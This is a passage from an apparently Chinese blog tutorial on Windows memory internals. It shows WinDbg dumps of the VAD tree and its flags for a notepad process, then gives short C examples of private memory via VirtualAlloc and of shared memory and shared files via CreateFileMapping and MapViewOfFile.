class="hljs-comment">//线性地址结束位置(页为单位)</span><br>   +<span class="hljs-number">0x008</span> Parent <span class="hljs-comment">//父节点</span><br>   +<span class="hljs-number">0x00c</span> LeftChild <span class="hljs-comment">//左子树</span><br>   +<span class="hljs-number">0x010</span> RightChild <span class="hljs-comment">//右子树</span><br>   +<span class="hljs-number">0x014</span> u <br>   +<span class="hljs-number">0x018</span> ControlArea<br>   +<span class="hljs-number">0x01c</span> FirstPrototypePte <br>   +<span class="hljs-number">0x020</span> LastContiguousPte<br>   +<span class="hljs-number">0x024</span> u2 <br></code></pre></td></tr></table></figure><p>前俩个成员表示了线性地址开始与结束地址，单位是页，所以乘上0x1000</p><p>parent是父节点，因为这是根节点所以是null</p><p>u表示了这段内存的属性</p><p><img src="image-20200827215516571.png" alt="image-20200827215516571"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c">kd&gt; dt _MMVAD_FLAGS<br>nt!_MMVAD_FLAGS<br>   +<span class="hljs-number">0x000</span> CommitCharge<br>   +<span class="hljs-number">0x000</span> PhysicalMapping<br>   +<span class="hljs-number">0x000</span> ImageMap <br><span class="hljs-comment">//1 镜像文件  0 其他</span><br>   +<span class="hljs-number">0x000</span> UserPhysicalPages <br>   +<span class="hljs-number">0x000</span> NoChange<br>   +<span class="hljs-number">0x000</span> WriteWatch <br>   +<span class="hljs-number">0x000</span> Protection<br><span class="hljs-comment">//1 READONLY  2  EXECUTE  3  EXECUTE _READ  4 READWITER  </span><br><span class="hljs-comment">//5 WRITECOPY  6  EXECUTE _READWITER   7 EXECUTE_WRITECOPY  </span><br>   +<span class="hljs-number">0x000</span> LargePages <br>   +<span class="hljs-number">0x000</span> MemCommit <br>   +<span class="hljs-number">0x000</span> PrivateMemory<br><span class="hljs-comment">//1 PrivateMemory 2 Map</span><br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">kd</span>&gt; !vad <span class="hljs-number">0</span>x<span class="hljs-number">89986468</span> <br><span class="hljs-attribute">VAD</span>   Level     Start       End Commit<br><span class="hljs-attribute">8953a9b8</span>  <span class="hljs-number">3</span>        <span class="hljs-number">10</span>        <span class="hljs-number">10</span>      <span class="hljs-number">1</span> Private      READWRITE          <br><span class="hljs-attribute">899b56f0</span>  <span class="hljs-number">2</span>        <span class="hljs-number">20</span>        <span class="hljs-number">20</span>      <span class="hljs-number">1</span> Private      READWRITE          <br><span class="hljs-attribute">899b55b0</span>  <span class="hljs-number">5</span>        <span class="hljs-number">30</span>        <span class="hljs-number">3</span>f      <span class="hljs-number">6</span> Private      READWRITE          <br><span class="hljs-attribute">89521148</span>  <span class="hljs-number">4</span>        <span class="hljs-number">40</span>        <span class="hljs-number">7</span>f     <span class="hljs-number">18</span> Private      READWRITE          <br><span class="hljs-attribute">89984880</span>  <span class="hljs-number">3</span>        <span class="hljs-number">80</span>        <span class="hljs-number">82</span>      <span class="hljs-number">0</span> Mapped       READONLY           Pagefile section, shared commit <span class="hljs-number">0</span>x<span class="hljs-number">3</span><br><span class="hljs-attribute">895191d0</span>  <span class="hljs-number">4</span>        <span class="hljs-number">90</span>        <span class="hljs-number">91</span>      <span class="hljs-number">0</span> Mapped       READONLY           Pagefile section, shared commit <span class="hljs-number">0</span>x<span class="hljs-number">2</span><br><span class="hljs-attribute">89a63878</span>  <span class="hljs-number">1</span>        a<span class="hljs-number">0</span>       <span class="hljs-number">19</span>f     <span class="hljs-number">21</span> Private      READWRITE          <br><span class="hljs-attribute">8997f0a8</span>  <span class="hljs-number">4</span>       <span class="hljs-number">1</span>a<span class="hljs-number">0</span>       <span class="hljs-number">1</span>af      <span class="hljs-number">6</span> Private      READWRITE          <br><span class="hljs-attribute">899b5a00</span>  <span class="hljs-number">3</span>       <span class="hljs-number">1</span>b<span class="hljs-number">0</span>       <span class="hljs-number">1</span>bf      <span class="hljs-number">0</span> Mapped       READWRITE          Pagefile section, shared commit <span class="hljs-number">0</span>x<span class="hljs-number">3</span><br><span class="hljs-attribute">8952c0a8</span>  <span class="hljs-number">4</span>       <span class="hljs-number">1</span>c<span class="hljs-number">0</span>       <span class="hljs-number">1</span>d<span class="hljs-number">5</span>      <span class="hljs-number">0</span> Mapped       READONLY           \WINDOWS\system<span class="hljs-number">32</span>\unicode.nls<br><span class="hljs-attribute">899b1870</span>  <span class="hljs-number">2</span>       <span class="hljs-number">1</span>e<span class="hljs-number">0</span>       <span class="hljs-number">220</span>      <span class="hljs-number">0</span> Mapped       READONLY           \WINDOWS\system<span class="hljs-number">32</span>\locale.nls<br><span class="hljs-attribute">899b57f0</span>  <span class="hljs-number">4</span>       <span class="hljs-number">230</span>       <span class="hljs-number">270</span>      <span class="hljs-number">0</span> Mapped       READONLY           \WINDOWS\system<span class="hljs-number">32</span>\sortkey.nls<br><span class="hljs-attribute">8997def0</span>  <span class="hljs-number">3</span>       <span class="hljs-number">280</span>       <span class="hljs-number">285</span>      <span class="hljs-number">0</span> Mapped       READONLY           \WINDOWS\system<span class="hljs-number">32</span>\sorttbls.nls<br><span class="hljs-attribute">89986468</span>  <span class="hljs-number">0</span>       <span class="hljs-number">290</span>       <span class="hljs-number">2</span>d<span class="hljs-number">0</span>      <span class="hljs-number">0</span> Mapped       READONLY           Pagefile section, shared commit <span class="hljs-number">0</span>x<span class="hljs-number">41</span><br><span class="hljs-attribute">89527cc0</span>  <span class="hljs-number">5</span>       <span class="hljs-number">2</span>e<span class="hljs-number">0</span>       <span class="hljs-number">3</span>a<span class="hljs-number">7</span>      <span class="hljs-number">0</span> Mapped       EXECUTE_READ       Pagefile section, shared commit <span class="hljs-number">0</span>x<span class="hljs-number">4</span><br><span class="hljs-attribute">8997c3f8</span>  <span class="hljs-number">6</span>       <span class="hljs-number">3</span>b<span class="hljs-number">0</span>       <span class="hljs-number">3</span>bf      <span class="hljs-number">8</span> Private      READWRITE          <br><span class="hljs-attribute">8956ac58</span>  <span class="hljs-number">7</span>       <span class="hljs-number">3</span>c<span class="hljs-number">0</span>       <span class="hljs-number">3</span>c<span class="hljs-number">0</span>      <span class="hljs-number">1</span> Private      READWRITE          <br><span class="hljs-attribute">895232a8</span>  <span class="hljs-number">8</span>       <span class="hljs-number">3</span>d<span class="hljs-number">0</span>       <span class="hljs-number">3</span>d<span class="hljs-number">0</span>      <span class="hljs-number">1</span> Private      READWRITE          <br><span class="hljs-attribute">895211c8</span> <span class="hljs-number">10</span>       <span class="hljs-number">3</span>e<span class="hljs-number">0</span>       <span class="hljs-number">3</span>e<span class="hljs-number">1</span>      <span class="hljs-number">0</span> Mapped       READONLY           Pagefile section, shared commit <span class="hljs-number">0</span>x<span class="hljs-number">2</span><br><span class="hljs-attribute">8953a6e0</span>  <span class="hljs-number">9</span>       <span class="hljs-number">3</span>f<span class="hljs-number">0</span>       <span class="hljs-number">3</span>f<span class="hljs-number">1</span>      <span class="hljs-number">0</span> Mapped       READONLY           Pagefile section, shared commit <span class="hljs-number">0</span>x<span class="hljs-number">2</span><br><span class="hljs-attribute">89c551b0</span> <span class="hljs-number">10</span>       <span class="hljs-number">400</span>       <span class="hljs-number">40</span>f      <span class="hljs-number">3</span> Private      READWRITE          <br><span class="hljs-attribute">89522b08</span>  <span class="hljs-number">4</span>       <span class="hljs-number">410</span>       <span class="hljs-number">41</span>f      <span class="hljs-number">8</span> Private      READWRITE          <br><span class="hljs-attribute">89519150</span>  <span class="hljs-number">3</span>       <span class="hljs-number">420</span>       <span class="hljs-number">42</span>f      <span class="hljs-number">4</span> Private      READWRITE          <br><span class="hljs-attribute">899798c8</span>  <span class="hljs-number">4</span>       <span class="hljs-number">430</span>       <span class="hljs-number">432</span>      <span class="hljs-number">0</span> Mapped       READONLY           \WINDOWS\system<span class="hljs-number">32</span>\ctype.nls<br><span class="hljs-attribute">8954b718</span>  <span class="hljs-number">2</span>       <span class="hljs-number">440</span>       <span class="hljs-number">47</span>f      <span class="hljs-number">3</span> Private      READWRITE          <br><span class="hljs-attribute">8996f178</span>  <span class="hljs-number">5</span>       <span class="hljs-number">480</span>       <span class="hljs-number">582</span>      <span class="hljs-number">0</span> Mapped       READONLY           Pagefile section, shared commit <span class="hljs-number">0</span>x<span class="hljs-number">103</span><br><span class="hljs-attribute">8996f218</span>  <span class="hljs-number">4</span>       <span class="hljs-number">590</span>       <span class="hljs-number">88</span>f      <span class="hljs-number">0</span> Mapped       EXECUTE_READ       Pagefile section, shared commit <span class="hljs-number">0</span>x<span class="hljs-number">22</span><br><span class="hljs-attribute">89b09108</span>  <span class="hljs-number">3</span>       <span class="hljs-number">890</span>       <span class="hljs-number">90</span>f      <span class="hljs-number">1</span> Private      READWRITE          <br><span class="hljs-attribute">89520ae8</span>  <span class="hljs-number">5</span>       <span class="hljs-number">910</span>       <span class="hljs-number">95</span>f      <span class="hljs-number">0</span> Mapped       READONLY           Pagefile section, shared commit <span class="hljs-number">0</span>x<span class="hljs-number">50</span><br><span class="hljs-attribute">89520b18</span>  <span class="hljs-number">4</span>       <span class="hljs-number">960</span>       <span class="hljs-number">960</span>      <span class="hljs-number">0</span> Mapped       READWRITE          Pagefile section, shared commit <span class="hljs-number">0</span>x<span class="hljs-number">1</span><br><span class="hljs-attribute">89981558</span>  <span class="hljs-number">6</span>       <span class="hljs-number">970</span>       <span class="hljs-number">9</span>af      <span class="hljs-number">0</span> Mapped       READWRITE          Pagefile section, shared commit <span class="hljs-number">0</span>x<span class="hljs-number">10</span><br><span class="hljs-attribute">899b5630</span>  <span class="hljs-number">5</span>       <span class="hljs-number">9</span>b<span class="hljs-number">0</span>       <span class="hljs-number">9</span>bd      <span class="hljs-number">0</span> Mapped       READWRITE          Pagefile section, shared commit <span class="hljs-number">0</span>xe<br><span class="hljs-attribute">899ad850</span>  <span class="hljs-number">7</span>       <span class="hljs-number">9</span>c<span class="hljs-number">0</span>       abf    <span class="hljs-number">123</span> Private      READWRITE          <br><span class="hljs-attribute">899b5a30</span>  <span class="hljs-number">6</span>       ad<span class="hljs-number">0</span>       b<span class="hljs-number">4</span>f      <span class="hljs-number">0</span> Mapped       READWRITE          Pagefile section, shared commit <span class="hljs-number">0</span>x<span class="hljs-number">7</span><br><span class="hljs-attribute">89546d90</span>  <span class="hljs-number">7</span>       b<span class="hljs-number">50</span>       bcf      <span class="hljs-number">0</span> Mapped       READWRITE          Pagefile section, shared commit <span class="hljs-number">0</span>x<span class="hljs-number">2</span><br><span class="hljs-attribute">899ba9e0</span>  <span class="hljs-number">1</span>      <span class="hljs-number">1000</span>      <span class="hljs-number">1012</span>      <span class="hljs-number">3</span> Mapped  Exe  EXECUTE_WRITECOPY  \WINDOWS\system<span class="hljs-number">32</span>\notepad.exe<br><span class="hljs-attribute">89527d30</span>  <span class="hljs-number">7</span>     <span class="hljs-number">58</span>fb<span class="hljs-number">0</span>     <span class="hljs-number">59179</span>      <span class="hljs-number">9</span> Mapped  Exe  EXECUTE_WRITECOPY  \WINDOWS\AppPatch\AcGenral.dll<br><span class="hljs-attribute">89519c60</span>  <span class="hljs-number">8</span>     <span class="hljs-number">5</span>adc<span class="hljs-number">0</span>     <span class="hljs-number">5</span>adf<span class="hljs-number">6</span>      <span class="hljs-number">2</span> Mapped  Exe  EXECUTE_WRITECOPY  \WINDOWS\system<span class="hljs-number">32</span>\uxtheme.dll<br><span class="hljs-attribute">89527c90</span>  <span class="hljs-number">6</span>     <span class="hljs-number">5</span>cc<span class="hljs-number">30</span>     <span class="hljs-number">5</span>cc<span class="hljs-number">55</span>     <span class="hljs-number">20</span> Mapped  Exe  EXECUTE_WRITECOPY  \WINDOWS\system<span class="hljs-number">32</span>\shimeng.dll<br><span class="hljs-attribute">8953a6b0</span>  <span class="hljs-number">7</span>     <span class="hljs-number">62</span>c<span class="hljs-number">20</span>     <span class="hljs-number">62</span>c<span class="hljs-number">28</span>      <span class="hljs-number">1</span> Mapped  Exe  EXECUTE_WRITECOPY  \WINDOWS\system<span class="hljs-number">32</span>\lpk.dll<br><span class="hljs-attribute">89522ad8</span>  <span class="hljs-number">5</span>     <span class="hljs-number">72</span>f<span class="hljs-number">70</span>     <span class="hljs-number">72</span>f<span class="hljs-number">95</span>      <span class="hljs-number">3</span> Mapped  Exe  EXECUTE_WRITECOPY  \WINDOWS\system<span class="hljs-number">32</span>\winspool.drv<br><span class="hljs-attribute">899b5660</span>  <span class="hljs-number">8</span>     <span class="hljs-number">73640</span>     <span class="hljs-number">7366</span>d      <span class="hljs-number">2</span> Mapped  Exe  EXECUTE_WRITECOPY  \WINDOWS\system<span class="hljs-number">32</span>\MSCTFIME.IME<br><span class="hljs-attribute">899b5970</span>  <span class="hljs-number">7</span>     <span class="hljs-number">73</span>fa<span class="hljs-number">0</span>     <span class="hljs-number">7400</span>a     <span class="hljs-number">16</span> Mapped  Exe  EXECUTE_WRITECOPY  \WINDOWS\system<span class="hljs-number">32</span>\usp<span class="hljs-number">10</span>.dll<br><span class="hljs-attribute">89518648</span>  <span class="hljs-number">8</span>     <span class="hljs-number">74680</span>     <span class="hljs-number">746</span>cb      <span class="hljs-number">3</span> Mapped  Exe  EXECUTE_WRITECOPY  \WINDOWS\system<span class="hljs-number">32</span>\MSCTF.dll<br><span class="hljs-attribute">895198f8</span>  <span class="hljs-number">6</span>     <span class="hljs-number">759</span>d<span class="hljs-number">0</span>     <span class="hljs-number">75</span>a<span class="hljs-number">7</span>e      <span class="hljs-number">3</span> Mapped  Exe  EXECUTE_WRITECOPY  \WINDOWS\system<span class="hljs-number">32</span>\userenv.dll<br><span class="hljs-attribute">89979c40</span>  <span class="hljs-number">7</span>     <span class="hljs-number">76300</span>     <span class="hljs-number">7631</span>c      <span class="hljs-number">1</span> Mapped  Exe  EXECUTE_WRITECOPY  \WINDOWS\system<span class="hljs-number">32</span>\imm<span class="hljs-number">32</span>.dll<br><span class="hljs-attribute">89a65c70</span>  <span class="hljs-number">4</span>     <span class="hljs-number">76320</span>     <span class="hljs-number">76366</span>      <span class="hljs-number">4</span> Mapped  Exe  EXECUTE_WRITECOPY  \WINDOWS\system<span class="hljs-number">32</span>\comdlg<span class="hljs-number">32</span>.dll<br><span class="hljs-attribute">899adb98</span>  <span class="hljs-number">8</span>     <span class="hljs-number">76990</span>     <span class="hljs-number">76</span>acc      <span class="hljs-number">8</span> Mapped  Exe  EXECUTE_WRITECOPY  \WINDOWS\system<span class="hljs-number">32</span>\ole<span class="hljs-number">32</span>.dll<br><span class="hljs-attribute">899ad7e0</span>  <span class="hljs-number">7</span>     <span class="hljs-number">76</span>b<span class="hljs-number">10</span>     <span class="hljs-number">76</span>b<span class="hljs-number">39</span>      <span class="hljs-number">2</span> Mapped  Exe  EXECUTE_WRITECOPY  \WINDOWS\system<span class="hljs-number">32</span>\winmm.dll<br><span class="hljs-attribute">899adbc8</span>  <span class="hljs-number">8</span>     <span class="hljs-number">770</span>f<span class="hljs-number">0</span>     <span class="hljs-number">7717</span>a      <span class="hljs-number">4</span> Mapped  Exe  EXECUTE_WRITECOPY  \WINDOWS\system<span class="hljs-number">32</span>\oleaut<span class="hljs-number">32</span>.dll<br><span class="hljs-attribute">899b6b38</span>  <span class="hljs-number">6</span>     <span class="hljs-number">77180</span>     <span class="hljs-number">77282</span>      <span class="hljs-number">2</span> Mapped  Exe  EXECUTE_WRITECOPY  \WINDOWS\WinSxS\x<span class="hljs-number">86</span>_Microsoft.Windows.Common-Controls_<span class="hljs-number">6595</span>b<span class="hljs-number">64144</span>ccf<span class="hljs-number">1</span>df_<span class="hljs-number">6</span>.<span class="hljs-number">0</span>.<span class="hljs-number">2600</span>.<span class="hljs-number">5512</span>_x-ww_<span class="hljs-number">35</span>d<span class="hljs-number">4</span>ce<span class="hljs-number">83</span>\comctl<span class="hljs-number">32</span>.dll<br><span class="hljs-attribute">899add30</span>  <span class="hljs-number">8</span>     <span class="hljs-number">77</span>bb<span class="hljs-number">0</span>     <span class="hljs-number">77</span>bc<span class="hljs-number">4</span>      <span class="hljs-number">2</span> Mapped  Exe  EXECUTE_WRITECOPY  \WINDOWS\system<span class="hljs-number">32</span>\msacm<span class="hljs-number">32</span>.dll<br><span class="hljs-attribute">895180a8</span>  <span class="hljs-number">9</span>     <span class="hljs-number">77</span>bd<span class="hljs-number">0</span>     <span class="hljs-number">77</span>bd<span class="hljs-number">7</span>      <span class="hljs-number">1</span> Mapped  Exe  EXECUTE_WRITECOPY  \WINDOWS\system<span class="hljs-number">32</span>\version.dll<br><span class="hljs-attribute">89b08508</span>  <span class="hljs-number">7</span>     <span class="hljs-number">77</span>be<span class="hljs-number">0</span>     <span class="hljs-number">77</span>c<span class="hljs-number">37</span>      <span class="hljs-number">7</span> Mapped  Exe  EXECUTE_WRITECOPY  \WINDOWS\system<span class="hljs-number">32</span>\msvcrt.dll<br><span class="hljs-attribute">895232e8</span>  <span class="hljs-number">8</span>     <span class="hljs-number">77</span>d<span class="hljs-number">10</span>     <span class="hljs-number">77</span>d<span class="hljs-number">9</span>f      <span class="hljs-number">2</span> Mapped  Exe  EXECUTE_WRITECOPY  \WINDOWS\system<span class="hljs-number">32</span>\user<span class="hljs-number">32</span>.dll<br><span class="hljs-attribute">8996f148</span>  <span class="hljs-number">5</span>     <span class="hljs-number">77</span>da<span class="hljs-number">0</span>     <span class="hljs-number">77</span>e<span class="hljs-number">48</span>      <span class="hljs-number">5</span> Mapped  Exe  EXECUTE_WRITECOPY  \WINDOWS\system<span class="hljs-number">32</span>\advapi<span class="hljs-number">32</span>.dll<br><span class="hljs-attribute">899b5690</span>  <span class="hljs-number">6</span>     <span class="hljs-number">77</span>e<span class="hljs-number">50</span>     <span class="hljs-number">77</span>ee<span class="hljs-number">1</span>      <span class="hljs-number">1</span> Mapped  Exe  EXECUTE_WRITECOPY  \WINDOWS\system<span class="hljs-number">32</span>\rpcrt<span class="hljs-number">4</span>.dll<br><span class="hljs-attribute">89b084d8</span>  <span class="hljs-number">8</span>     <span class="hljs-number">77</span>ef<span class="hljs-number">0</span>     <span class="hljs-number">77</span>f<span class="hljs-number">38</span>      <span class="hljs-number">2</span> Mapped  Exe  EXECUTE_WRITECOPY  \WINDOWS\system<span class="hljs-number">32</span>\gdi<span class="hljs-number">32</span>.dll<br><span class="hljs-attribute">89b08478</span>  <span class="hljs-number">9</span>     <span class="hljs-number">77</span>f<span class="hljs-number">40</span>     <span class="hljs-number">77</span>fb<span class="hljs-number">5</span>      <span class="hljs-number">2</span> Mapped  Exe  EXECUTE_WRITECOPY  \WINDOWS\system<span class="hljs-number">32</span>\shlwapi.dll<br><span class="hljs-attribute">899b5710</span>  <span class="hljs-number">7</span>     <span class="hljs-number">77</span>fc<span class="hljs-number">0</span>     <span class="hljs-number">77</span>fd<span class="hljs-number">0</span>      <span class="hljs-number">1</span> Mapped  Exe  EXECUTE_WRITECOPY  \WINDOWS\system<span class="hljs-number">32</span>\secur<span class="hljs-number">32</span>.dll<br><span class="hljs-attribute">899b5a90</span>  <span class="hljs-number">3</span>     <span class="hljs-number">7</span>c<span class="hljs-number">800</span>     <span class="hljs-number">7</span>c<span class="hljs-number">91</span>d      <span class="hljs-number">5</span> Mapped  Exe  EXECUTE_WRITECOPY  \WINDOWS\system<span class="hljs-number">32</span>\kernel<span class="hljs-number">32</span>.dll<br><span class="hljs-attribute">899848b0</span>  <span class="hljs-number">2</span>     <span class="hljs-number">7</span>c<span class="hljs-number">920</span>     <span class="hljs-number">7</span>c<span class="hljs-number">9</span>b<span class="hljs-number">2</span>      <span class="hljs-number">5</span> Mapped  Exe  EXECUTE_WRITECOPY  \WINDOWS\system<span class="hljs-number">32</span>\ntdll.dll<br><span class="hljs-attribute">899b58e0</span>  <span class="hljs-number">5</span>     <span class="hljs-number">7</span>d<span class="hljs-number">590</span>     <span class="hljs-number">7</span>dd<span class="hljs-number">83</span>     <span class="hljs-number">30</span> Mapped  Exe  EXECUTE_WRITECOPY  \WINDOWS\system<span class="hljs-number">32</span>\shell<span class="hljs-number">32</span>.dll<br><span class="hljs-attribute">899b57c0</span>  <span class="hljs-number">4</span>     <span class="hljs-number">7</span>f<span class="hljs-number">6</span>f<span class="hljs-number">0</span>     <span class="hljs-number">7</span>f<span class="hljs-number">7</span>ef      <span class="hljs-number">0</span> Mapped       EXECUTE_READ       Pagefile section, shared commit <span class="hljs-number">0</span>x<span class="hljs-number">6</span><br><span class="hljs-attribute">89984850</span>  <span class="hljs-number">3</span>     <span class="hljs-number">7</span>ffa<span class="hljs-number">0</span>     <span class="hljs-number">7</span>ffd<span class="hljs-number">2</span>      <span class="hljs-number">0</span> Mapped       READONLY           Pagefile section, shared commit <span class="hljs-number">0</span>x<span class="hljs-number">33</span><br><span class="hljs-attribute">89983180</span>  <span class="hljs-number">4</span>     <span class="hljs-number">7</span>ffd<span class="hljs-number">4</span>     <span class="hljs-number">7</span>ffd<span class="hljs-number">4</span>      <span class="hljs-number">1</span> Private      READWRITE          <br><span class="hljs-attribute">899ad870</span>  <span class="hljs-number">5</span>     <span class="hljs-number">7</span>ffdf     <span class="hljs-number">7</span>ffdf      <span class="hljs-number">1</span> Private      READWRITE          <br></code></pre></td></tr></table></figure><p>用!vad指令来查看一波notepad的vad树</p><p>89986468  0       290       2d0      0 Mapped       READONLY           Pagefile section, shared commit 0x41</p><p>以这个为例之前看到PrivateMemory为0所以是map</p><p>Protection是1所以是READONLY</p><p>ImageMap是0所以非镜像文件</p><p>!vad这个指令其实就是方便寻找，如何实现也显而易见</p><h1 id="windows线性地址管理"><a href="#windows线性地址管理" class="headerlink" title="windows线性地址管理"></a>windows线性地址管理</h1><p>windows有俩种申请内存的方式</p><p>1.通过VirtualAlloc/VirtualAllocEx申请 Private Memory</p><p>2.通过CreateFileMapping映射 Mapped Memory</p><h2 id="Private-Memory"><a href="#Private-Memory" class="headerlink" title="Private  Memory"></a>Private  Memory</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">LPVOID VirtualAlloc&#123;<br>LPVOID lpAddress, <span class="hljs-comment">// 要分配的内存区域的地址</span><br>DWORD dwSize, <span class="hljs-comment">// 分配的大小</span><br>DWORD flAllocationType, <span class="hljs-comment">// 分配的类型</span><br>DWORD flProtect <span class="hljs-comment">// 该内存的初始保护属性</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>可能有人会疑惑像malloc这种函数也是申请内存，为什么不在里面。</p><p>进程初始化的时候操作系统会用VirtualAlloc/VirtualAllocEx申请一块堆块，malloc只是从那块申请的堆块中拿出一小份</p><p>这些知识打过pwn的同学都知道</p><h2 id="Mapped-Memory"><a href="#Mapped-Memory" class="headerlink" title="Mapped  Memory"></a>Mapped  Memory</h2><p>mapped memory主分俩种，共享内存和共享文件</p><h3 id="共享内存"><a href="#共享内存" class="headerlink" title="共享内存"></a>共享内存</h3><p>也就是映射在同一个物理页</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _CRT_SECURE_NO_DEPRECATE</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;tlhelp32.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MapFileName <span class="hljs-meta-string">&quot;共享内存&quot;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">//内核对象:1、物理页     2、文件</span><br>HANDLE g_hMapFile = CreateFileMapping(INVALID_HANDLE_VALUE, <span class="hljs-literal">NULL</span>, PAGE_READWRITE, <span class="hljs-number">0</span>, BUFSIZ, (LPCWCHAR)MapFileName);<br><br><span class="hljs-comment">//将物理页与线性地址进行映射</span><br>LPTSTR g_lpBuff = (LPTSTR)MapViewOfFile(g_hMapFile, FILE_MAP_ALL_ACCESS, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, BUFSIZ);<br>*(PDWORD)g_lpBuff = <span class="hljs-number">0x12345678</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%p&quot;</span>, g_lpBuff);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>当其他进程需要该内存时用OpenFileMapping即可，MapFileName就是其参数</p><p>和之前内核对象的学习很像</p><h3 id="共享文件"><a href="#共享文件" class="headerlink" title="共享文件"></a>共享文件</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _CRT_SECURE_NO_DEPRECATE</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;tlhelp32.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>HANDLE g_hFile = CreateFile((LPCWSTR)<span class="hljs-string">&quot;NOTEPAD.EXE&quot;</span>, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, <span class="hljs-literal">NULL</span>, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, <span class="hljs-literal">NULL</span>);<br>HANDLE g_hMapFile = CreateFileMapping(g_hFile, <span class="hljs-literal">NULL</span>, PAGE_READWRITE, <span class="hljs-number">0</span>, BUFSIZ, <span class="hljs-literal">NULL</span>);<br>LPTSTR g_lpBuff = (LPTSTR)MapViewOfFile(g_hMapFile, FILE_MAP_ALL_ACCESS, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, BUFSIZ);<br>*(PDWORD)g_lpBuff = <span class="hljs-number">0x12345678</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>共享文件和共享内存区别就在于一个获取句柄，CreateFileMapping时传入即可，这是会给改文件分配一个物理页，但是还不会建立与线性地址的映射关系，到MapViewOfFile时才会建立</p><h3 id="镜像文件"><a href="#镜像文件" class="headerlink" 